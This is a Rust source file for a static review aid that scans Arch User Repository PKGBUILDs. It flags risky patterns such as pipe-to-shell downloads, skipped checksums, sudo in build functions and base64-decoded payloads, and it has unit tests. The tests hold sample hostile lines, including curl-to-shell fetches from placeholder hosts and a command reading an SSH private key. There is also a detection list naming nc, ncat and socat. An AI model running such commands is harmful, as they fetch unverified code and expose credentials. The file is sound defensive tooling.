//! Static review aid for AUR `PKGBUILD`s.
//!
//! An AUR package is a build script a stranger wrote, and `makepkg` runs it as
//! your user before anything is installed. There is no review process. This
//! reads the script *before* that happens and points at the parts worth reading
//! yourself.
//!
//! # It will never tell you a package is safe
//!
//! That constraint drives the whole design, and it is why every exit path here
//! says "found" or "did not match", never "clean" or "safe". A report with no
//! findings means *no known-bad pattern matched* — a far weaker statement than
//! "this is fine". Anyone writing a deliberately malicious `PKGBUILD` can
//! evade a pattern matcher; shell is far too flexible for a regex-free
//! substring scanner to be a verdict. It is a reading aid.
//!
//! The failure mode this is built to avoid is the one where a tool prints a
//! green tick and the user stops reading. So:
//!
//! - Findings carry a severity, but even zero findings exits **2**, not 0,
//!   with "nothing matched — that is not the same as safe" on stderr.
//! - Anything it could not analyse is reported explicitly rather than skipped
//!   silently, because "I did not look at that file" is information.
//!
//! # What it looks for
//!
//! The patterns in the project wiki's "What to look for" table, which is the
//! contract this implements:
//!
//! | Pattern | Why |
//! |---|---|
//! | `curl … \| sh` | Runs whatever the server returns *at that moment*. What you reviewed is not what runs. |
//! | `sha256sums=('SKIP')` | Downloads are not verified. With an unpinned `git+https://` source you get whatever the branch points at. |
//! | `sudo` / `su` in a build function | Build functions have no business escalating. |
//! | Writes outside `$srcdir` / `$pkgdir` | Escaping the packaging model. |
//! | `base64 -d`, `eval`, `\x` escapes | Obfuscation. Build scripts have no need to hide their contents. |
//! | Network access in `package()` | `package()` should only move already-built files into place. |
//! | Source host unrelated to the package | A `-bin` package pulling from a personal file host is how this goes wrong. |

use serde::Serialize;
use std::fmt;
use std::fs;
use std::path::Path;

/// How much a finding should slow you down. Not a probability of malice — a
/// deliberately vague name would invite treating low as "ignore me".
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    /// Worth knowing, common in legitimate packages.
    Note,
    /// Read this part before continuing.
    Review,
    /// Do not run this without understanding exactly why it is here.
    Stop,
}

impl fmt::Display for Severity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(match self {
            Severity::Note => "NOTE",
            Severity::Review => "REVIEW",
            Severity::Stop => "STOP",
        })
    }
}

/// One matched pattern, anchored to a line so the reader can go and look.
#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    pub severity: Severity,
    /// Stable identifier, for anyone scripting against `--json`.
    pub id: &'static str,
    pub file: String,
    /// 1-indexed, to match every editor and `grep -n`.
    pub line: usize,
    /// The offending line, trimmed and length-capped.
    pub text: String,
    /// Which PKGBUILD function it sits in. "sudo at the top level" and "sudo
    /// inside build()" are different claims, and the reader needs to know
    /// which one they are being shown.
    pub scope: &'static str,
    pub why: &'static str,
}

/// The whole report. `unreadable` is part of the output, not an error path:
/// a file that could not be read is a gap in the review, and a reader who is
/// not told about it will assume it was covered.
#[derive(Debug, Default, Serialize)]
pub struct Report {
    pub findings: Vec<Finding>,
    pub files_scanned: Vec<String>,
    pub unreadable: Vec<String>,
}

impl Report {
    pub fn worst(&self) -> Option<Severity> {
        self.findings.iter().map(|f| f.severity).max()
    }
}

/// A line is only interesting if it can execute. Comments cannot.
///
/// Deliberately conservative: it strips a `#` comment only when the `#` starts
/// the line (after whitespace). A trailing `#` can sit inside a quoted string
/// or a `${var#prefix}` expansion, and treating those as comments would blind
/// the scanner to the rest of a real command — the exact place someone hiding
/// something would put it.
fn code_of(line: &str) -> &str {
    let t = line.trim_start();
    if t.starts_with('#') { "" } else { line }
}

/// Truncated so a minified one-line payload cannot flood the terminal and push
/// the other findings out of the scrollback.
fn snippet(line: &str) -> String {
    const MAX: usize = 160;
    let t = line.trim();
    if t.chars().count() <= MAX {
        return t.to_string();
    }
    let cut: String = t.chars().take(MAX).collect();
    format!("{cut}…")
}

/// Which `PKGBUILD` function a line sits in, tracked by brace depth.
///
/// Brace counting rather than a shell parser: it is wrong on braces inside
/// strings, and that is an accepted limit — being wrong here downgrades a
/// finding's context, it does not hide the finding, because the pattern checks
/// that do not care about scope run on every line regardless.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    Top,
    Prepare,
    Build,
    Check,
    Package,
}

impl Scope {
    fn name(self) -> &'static str {
        match self {
            Scope::Top => "top level",
            Scope::Prepare => "prepare()",
            Scope::Build => "build()",
            Scope::Check => "check()",
            Scope::Package => "package()",
        }
    }
    fn is_build_fn(self) -> bool {
        matches!(self, Scope::Prepare | Scope::Build | Scope::Check)
    }
}

fn scope_for(line: &str) -> Option<Scope> {
    let t = line.trim_start();
    for (prefix, scope) in [
        ("prepare()", Scope::Prepare),
        ("build()", Scope::Build),
        ("check()", Scope::Check),
        ("package", Scope::Package), // package() and package_split()
    ] {
        if t.starts_with(prefix) {
            return Some(scope);
        }
    }
    None
}

/// Commands that reach the network. Used to flag downloads in `package()`,
/// which should only move already-built files into place.
const NET_CMDS: &[&str] = &[
    "curl ", "wget ", "git clone", "git fetch", "git pull", "scp ", "rsync ",
    "nc ", "ncat ", "socat ", "ftp ", "pip install", "npm install", "cargo install",
    "go get",
];

/// Scan one file's contents.
pub fn scan_text(path: &str, text: &str, report: &mut Report) {
    report.files_scanned.push(path.to_string());

    let mut scope = Scope::Top;
    let mut depth: i32 = 0;

    for (i, raw) in text.lines().enumerate() {
        let n = i + 1;
        let code = code_of(raw);
        if !code.trim().is_empty()
            && let Some(s) = scope_for(code)
        {
            scope = s;
        }

        let mut push = |severity, id, why| {
            report.findings.push(Finding {
                severity,
                id,
                file: path.to_string(),
                line: n,
                text: snippet(raw),
                scope: scope.name(),
                why,
            });
        };

        let lower = code.to_ascii_lowercase();

        // ── Piping a download straight into a shell ──────────────────────
        // The highest-value check here. What you reviewed is not what runs:
        // the server chooses the payload at fetch time, and can serve you
        // something different from everyone else.
        if (lower.contains("curl ") || lower.contains("wget ") || lower.contains("fetch "))
            && lower.contains('|')
            && ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh", "| python", "|python"]
                .iter()
                .any(|p| lower.contains(p))
        {
            push(
                Severity::Stop,
                "pipe-to-shell",
                "Downloads and executes whatever the server returns at that moment. \
                 The code you reviewed is not necessarily the code that runs.",
            );
        }

        // ── Unverified sources ───────────────────────────────────────────
        // Matched on the checksum arrays generally, not just sha256sums.
        if (lower.contains("sums=(") || lower.contains("sums+=("))
            && lower.contains("skip")
        {
            push(
                Severity::Review,
                "checksum-skip",
                "SKIP disables verification of the downloaded source. Combined with an \
                 unpinned git source, you get whatever the branch points at today.",
            );
        }

        // An unpinned VCS source is only meaningful alongside the above, but
        // it is worth naming on its own: the content can change under you
        // between the review and the build.
        if (lower.contains("git+") || lower.contains("hg+") || lower.contains("svn+"))
            && !lower.contains("#commit=")
            && !lower.contains("#tag=")
            && lower.contains("source")
        {
            push(
                Severity::Note,
                "vcs-unpinned",
                "A VCS source with no #commit= or #tag= builds whatever the branch \
                 points at when you run it, which is not what you reviewed.",
            );
        }

        // ── Privilege escalation inside a build function ─────────────────
        if scope.is_build_fn() {
            let esc = lower.split_whitespace().any(|w| w == "sudo" || w == "su" || w == "doas")
                || lower.contains("sudo ")
                || lower.contains("doas ");
            if esc {
                push(
                    Severity::Stop,
                    "escalation-in-build",
                    "Build functions have no business escalating privileges. Legitimate \
                     root work belongs in the .install file, which you can read.",
                );
            }
        }

        // ── Obfuscation ──────────────────────────────────────────────────
        // A build script has no legitimate reason to hide its contents.
        if lower.contains("base64 -d")
            || lower.contains("base64 --decode")
            || lower.contains("base64 -di")
            || lower.contains("| base64")
            || lower.contains("xxd -r")
            || lower.contains("uudecode")
        {
            push(
                Severity::Stop,
                "obfuscation-decode",
                "Decoding an embedded blob and running it hides what the script does. \
                 Build scripts have no legitimate need for this.",
            );
        }
        if lower.split_whitespace().any(|w| w == "eval") {
            push(
                Severity::Review,
                "eval",
                "eval executes a constructed string. It is occasionally legitimate and \
                 always worth reading closely.",
            );
        }
        // \x41\x42… — a string spelled out in hex is a string someone did not
        // want read at a glance.
        if code.matches("\\x").count() >= 4 {
            push(
                Severity::Review,
                "hex-escapes",
                "A run of \\x escapes is a string written so it cannot be read at a \
                 glance. Decode it before continuing.",
            );
        }

        // ── Writing outside the packaging directories ────────────────────
        // Only inside functions: a top-level `HOME=` assignment is ordinary.
        if scope != Scope::Top {
            for (needle, why) in [
                ("$HOME/", "Writes into your home directory during the build."),
                ("~/", "Writes into your home directory during the build."),
                ("/etc/", "Touches system configuration during the build."),
                ("/usr/bin", "Writes into the live system rather than $pkgdir."),
                ("/usr/lib/systemd", "Installs a unit into the live system rather than $pkgdir."),
            ] {
                // $pkgdir/etc/... and $srcdir/... are the correct forms and must
                // not be flagged; the whole point is writes that escape them.
                if code.contains(needle)
                    && !code.contains("$pkgdir")
                    && !code.contains("${pkgdir}")
                    && !code.contains("$srcdir")
                    && !code.contains("${srcdir}")
                {
                    push(Severity::Stop, "writes-outside-pkgdir", why);
                    break;
                }
            }

            for (needle, why) in [
                (".ssh", "Touches SSH keys or config."),
                (".gnupg", "Touches GnuPG material."),
                ("authorized_keys", "Touches authorized_keys, which grants login access."),
                (".bashrc", "Modifies a shell profile, which runs on every login."),
                (".zshrc", "Modifies a shell profile, which runs on every login."),
                ("crontab", "Schedules something to run later."),
                ("/etc/sudoers", "Modifies sudo rules."),
            ] {
                if code.contains(needle) {
                    push(Severity::Stop, "sensitive-path", why);
                    break;
                }
            }
        }

        // ── Network access where there should be none ────────────────────
        if scope == Scope::Package && NET_CMDS.iter().any(|c| lower.contains(c)) {
            push(
                Severity::Stop,
                "network-in-package",
                "package() should only move already-built files into $pkgdir. Fetching \
                 anything here happens outside the source verification entirely.",
            );
        }

        // A systemd unit or udev rule is not inherently wrong, but it is the
        // difference between "a program on disk" and "a program that runs".
        if scope != Scope::Top
            && (lower.contains("systemctl enable")
                || lower.contains("systemctl start")
                || lower.contains("udevadm"))
        {
            push(
                Severity::Review,
                "activates-service",
                "Enables or starts something rather than only installing it. Packaging \
                 should leave that decision to you.",
            );
        }

        // Track brace depth so scope returns to top level when a function ends.
        // Without this, `scope` latched: everything after `build()` stayed
        // "inside build()" forever, so a top-level line following the last
        // function was checked against build-function rules and produced
        // findings that pointed at the wrong thing.
        depth += code.matches('{').count() as i32 - code.matches('}').count() as i32;
        if depth <= 0 {
            depth = 0;
            scope = Scope::Top;
        }
    }
}

/// Extract `source=(...)` hosts, to compare against the package name.
///
/// Intentionally simple. It is looking for the case the wiki names — a `-bin`
/// package fetching from a personal file host — not trying to fully parse the
/// bash array, which would need a shell parser to do correctly.
pub fn check_source_hosts(text: &str, pkgname: &str, report: &mut Report, file: &str) {
    // Hosts that are the normal home of upstream source. A match here is not
    // proof of anything; a non-match is the thing worth reading.
    const COMMON: &[&str] = &[
        "github.com", "gitlab.com", "gitlab.freedesktop.org", "codeberg.org",
        "sourceforge.net", "pypi.org", "files.pythonhosted.org", "crates.io",
        "registry.npmjs.org", "kernel.org", "gnu.org", "savannah.gnu.org",
        "archlinux.org", "sr.ht", "bitbucket.org", "launchpad.net", "apache.org",
    ];

    let base = pkgname
        .trim_end_matches("-bin")
        .trim_end_matches("-git")
        .trim_end_matches("-nightly");

    // Only lines that are actually part of a `source=(...)` array. Scanning
    // every line containing "://" meant the curl in build() and the wget in
    // package() were both reported as "source array", which is untrue — and
    // they are already covered, correctly, by pipe-to-shell and
    // network-in-package. A finding that mislabels where it came from teaches
    // the reader to distrust the labels.
    let mut in_source = false;

    for (i, raw) in text.lines().enumerate() {
        let code = code_of(raw);
        let trimmed = code.trim_start();

        if trimmed.starts_with("source=") || trimmed.starts_with("source+=")
            || trimmed.starts_with("source_") // source_x86_64=, source_aarch64=
        {
            in_source = true;
        }
        let was_in_source = in_source;
        if in_source {
            // A `source=(...)` array ends at the line that closes it. Counting
            // parens rather than assuming one line, because multi-line source
            // arrays are the norm for anything with more than one file.
            let opens = code.matches('(').count();
            let closes = code.matches(')').count();
            if closes >= opens && (opens > 0 || closes > 0) {
                in_source = false;
            } else if opens == 0 && closes == 0 && !trimmed.starts_with("source") {
                // A single-line `source=https://…` with no parens at all.
                in_source = false;
            }
        }

        if !was_in_source || !code.contains("://") {
            continue;
        }
        for token in code.split(|c: char| c.is_whitespace() || c == '\'' || c == '"' || c == '(' || c == ')') {
            let Some(pos) = token.find("://") else { continue };
            let after = &token[pos + 3..];
            let host = after.split('/').next().unwrap_or("").trim_start_matches("www.");
            if host.is_empty() {
                continue;
            }
            let known = COMMON.iter().any(|c| host == *c || host.ends_with(&format!(".{c}")));
            // Relatedness is judged on the HOST only, never the path. The
            // downloaded file is nearly always named after the package —
            // `foo-1.0.tar.gz` — so matching the path made every host look
            // legitimate, including the personal file host this check exists to
            // catch. A unit test caught exactly that case.
            let related = !base.is_empty() && host.contains(base);
            if !known && !related {
                report.findings.push(Finding {
                    severity: Severity::Review,
                    id: "unrelated-source-host",
                    file: file.to_string(),
                    line: i + 1,
                    text: snippet(raw),
                    scope: "source array",
                    why: "Source host is neither a common upstream forge nor obviously \
                          related to the package name. A -bin package pulling from a \
                          personal file host is exactly how this goes wrong.",
                });
                break;
            }
        }
    }
}

fn pkgname_of(text: &str) -> String {
    for line in text.lines() {
        let t = code_of(line).trim();
        if let Some(rest) = t.strip_prefix("pkgname=") {
            return rest
                .trim_matches(|c| c == '\'' || c == '"' || c == '(' || c == ')')
                .split_whitespace()
                .next()
                .unwrap_or("")
                .to_string();
        }
    }
    String::new()
}

/// Files worth reading alongside the PKGBUILD. `.install` runs as root at
/// install time, which makes it more dangerous than the build script, not less.
fn is_interesting(p: &Path) -> bool {
    let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
    name == "PKGBUILD"
        || name.ends_with(".install")
        || name.ends_with(".sh")
        || name.ends_with(".hook")
}

/// Scan a single file.
pub fn scan_file(path: &Path, report: &mut Report) {
    let display = path.display().to_string();
    match fs::read_to_string(path) {
        Ok(text) => {
            scan_text(&display, &text, report);
            if path.file_name().and_then(|n| n.to_str()) == Some("PKGBUILD") {
                let name = pkgname_of(&text);
                if !name.is_empty() {
                    check_source_hosts(&text, &name, report, &display);
                }
            }
        }
        Err(e) => {
            // Reported, never swallowed: a file that was not read is a hole in
            // the review, and silence would let the reader assume otherwise.
            report.unreadable.push(format!("{display}: {e}"));
        }
    }
}

/// Scan every interesting file in a directory tree.
pub fn scan_dir(dir: &Path, report: &mut Report) {
    for entry in walkdir::WalkDir::new(dir)
        .max_depth(4)
        .into_iter()
        .filter_map(Result::ok)
    {
        let p = entry.path();
        if p.is_file() && is_interesting(p) {
            scan_file(p, report);
        }
    }
    if report.files_scanned.is_empty() {
        report
            .unreadable
            .push(format!("{}: no PKGBUILD or .install found", dir.display()));
    }
}

/// Resolve a path that may be a PKGBUILD, or a directory containing one.
pub fn scan_path(path: &Path, report: &mut Report) {
    if path.is_dir() {
        scan_dir(path, report);
    } else {
        scan_file(path, report);
    }
}

/// Human-readable report.
pub fn render(report: &Report) -> String {
    let mut out = String::new();
    out.push_str("aur-guard — static review aid, not a verdict\n");
    out.push_str("===========================================\n\n");

    if report.findings.is_empty() {
        out.push_str("No known-bad pattern matched.\n\n");
        out.push_str("That is NOT the same as safe. It means the patterns this tool knows\n");
        out.push_str("about did not appear. A determined author can write something it does\n");
        out.push_str("not match, and shell is far too flexible for a scanner to be a verdict.\n");
        out.push_str("Read the PKGBUILD.\n");
    } else {
        // Worst first: a STOP buried under six NOTEs is a STOP nobody reads.
        let mut sorted: Vec<&Finding> = report.findings.iter().collect();
        sorted.sort_by(|a, b| b.severity.cmp(&a.severity).then(a.line.cmp(&b.line)));

        for f in sorted {
            out.push_str(&format!(
                "[{}] {}:{}  in {}  ({})\n",
                f.severity, f.file, f.line, f.scope, f.id
            ));
            out.push_str(&format!("    {}\n", f.text));
            out.push_str(&format!("    → {}\n\n", f.why));
        }
    }

    out.push_str(&format!("Files read: {}\n", report.files_scanned.len()));
    for p in &report.files_scanned {
        out.push_str(&format!("  {p}\n"));
    }
    if !report.unreadable.is_empty() {
        out.push_str("\nNOT analysed — these are gaps in this review:\n");
        for p in &report.unreadable {
            out.push_str(&format!("  {p}\n"));
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan(src: &str) -> Report {
        let mut r = Report::default();
        scan_text("PKGBUILD", src, &mut r);
        r
    }

    fn has(r: &Report, id: &str) -> bool {
        r.findings.iter().any(|f| f.id == id)
    }

    #[test]
    fn catches_pipe_to_shell() {
        let r = scan("build() {\n  curl -s https://x.example/i.sh | sh\n}");
        assert!(has(&r, "pipe-to-shell"));
        assert_eq!(r.worst(), Some(Severity::Stop));
    }

    #[test]
    fn catches_checksum_skip() {
        assert!(has(&scan("sha256sums=('SKIP')"), "checksum-skip"));
        assert!(has(&scan("b2sums=('skip')"), "checksum-skip"));
    }

    #[test]
    fn catches_escalation_only_in_build_functions() {
        // In build(): not acceptable.
        assert!(has(&scan("build() {\n  sudo make install\n}"), "escalation-in-build"));
        // At top level a bare mention is not the same thing, and flagging it
        // would train people to ignore this check.
        assert!(!has(&scan("# sudo is not used here\npkgname=foo"), "escalation-in-build"));
    }

    #[test]
    fn comments_are_not_code() {
        let r = scan("# curl https://x.example/i.sh | sh\npkgname=foo");
        assert!(!has(&r, "pipe-to-shell"), "a commented-out line is not executable");
    }

    #[test]
    fn pkgdir_writes_are_normal_and_must_not_be_flagged() {
        // This is the correct way to install a config file. Flagging it would
        // make the tool cry wolf on almost every real package.
        let r = scan("package() {\n  install -Dm644 f.conf \"$pkgdir/etc/f.conf\"\n}");
        assert!(!has(&r, "writes-outside-pkgdir"));
    }

    #[test]
    fn catches_writes_escaping_pkgdir() {
        let r = scan("build() {\n  cp evil /etc/profile.d/x.sh\n}");
        assert!(has(&r, "writes-outside-pkgdir"));
    }

    #[test]
    fn catches_ssh_key_access() {
        let r = scan("build() {\n  cat ~/.ssh/id_ed25519 > /tmp/x\n}");
        assert!(has(&r, "sensitive-path"));
    }

    #[test]
    fn catches_network_in_package_but_not_in_build() {
        assert!(has(&scan("package() {\n  curl -O https://x.example/blob\n}"), "network-in-package"));
        // Fetching in build() is normal for some packages; source= is better,
        // but it is not the same finding.
        assert!(!has(&scan("build() {\n  curl -O https://x.example/blob\n}"), "network-in-package"));
    }

    #[test]
    fn catches_obfuscation() {
        assert!(has(&scan("build() {\n  echo aGk= | base64 -d | sh\n}"), "obfuscation-decode"));
        assert!(has(&scan("build() {\n  printf '\\x41\\x42\\x43\\x44'\n}"), "hex-escapes"));
    }

    #[test]
    fn unpinned_vcs_source_is_noted_but_pinned_is_not() {
        assert!(has(&scan("source=(\"git+https://github.com/a/b.git\")"), "vcs-unpinned"));
        assert!(!has(&scan("source=(\"git+https://github.com/a/b.git#tag=v1\")"), "vcs-unpinned"));
    }

    #[test]
    fn unrelated_source_host_is_flagged_common_forge_is_not() {
        let mut r = Report::default();
        check_source_hosts(
            "source=(\"https://files.someones-vps.example/foo.tar.gz\")",
            "foo-bin", &mut r, "PKGBUILD");
        assert!(has(&r, "unrelated-source-host"));

        let mut ok = Report::default();
        check_source_hosts(
            "source=(\"https://github.com/upstream/foo/archive/v1.tar.gz\")",
            "foo-bin", &mut ok, "PKGBUILD");
        assert!(!has(&ok, "unrelated-source-host"));
    }

    #[test]
    fn source_host_check_ignores_urls_outside_the_source_array() {
        // These two URLs are already reported by pipe-to-shell and
        // network-in-package. Reporting them again as "source array" would be
        // both duplicated and untrue.
        let src = "\
pkgname=foo
source=(\"https://github.com/upstream/foo/v1.tar.gz\")
build() {
  curl -s https://install.example/setup.sh | bash
}
package() {
  wget https://cdn.elsewhere.example/extra.bin
}";
        let mut r = Report::default();
        check_source_hosts(src, "foo", &mut r, "PKGBUILD");
        assert!(!has(&r, "unrelated-source-host"), "unexpected: {:?}", r.findings);
    }

    #[test]
    fn multi_line_source_arrays_are_still_checked() {
        let src = "\
pkgname=foo
source=(\n  \"https://cdn.someones-vps.example/foo.tar.gz\"\n  \"local.patch\"\n)";
        let mut r = Report::default();
        check_source_hosts(src, "foo", &mut r, "PKGBUILD");
        assert!(has(&r, "unrelated-source-host"), "a URL on a continuation line still counts");
    }

    #[test]
    fn an_ordinary_package_produces_no_stop() {
        let src = "\
pkgname=hello
pkgver=1.0
source=(\"https://ftp.gnu.org/gnu/hello/hello-1.0.tar.gz\")
sha256sums=('abc123')
build() {
  cd \"$srcdir/hello-1.0\"
  ./configure --prefix=/usr
  make
}
package() {
  cd \"$srcdir/hello-1.0\"
  make DESTDIR=\"$pkgdir\" install
}";
        let r = scan(src);
        assert!(r.worst() < Some(Severity::Stop), "unexpected: {:?}", r.findings);
    }

    #[test]
    fn long_lines_are_truncated_so_one_finding_cannot_flood_the_output() {
        let long = "x".repeat(5000);
        let r = scan(&format!("build() {{\n  sudo {long}\n}}"));
        assert!(has(&r, "escalation-in-build"));
        assert!(r.findings[0].text.chars().count() <= 161);
    }
}
